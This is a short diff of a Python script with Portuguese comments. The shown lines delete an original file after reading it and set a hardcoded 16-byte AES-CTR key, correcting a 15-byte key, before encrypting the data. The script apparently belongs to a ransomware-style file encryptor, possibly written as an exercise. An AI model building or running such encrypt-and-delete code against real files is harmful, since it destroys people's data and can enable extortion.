@@ -16,8 +16,8 @@ with open(file_name, "rb") as file:
 os.remove(file_name)
 print(f"[-] Arquivo original '{file_name}' removido.")
 
-# Chave de criptografia simétrica de 16 bytes (128 bits)
-key = b"msantos2026sant"
+# Chave de criptografia simétrica de extamente 16 bytes (128 bits)
+key = b"msantos2026santo"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 # Criptografar os dados
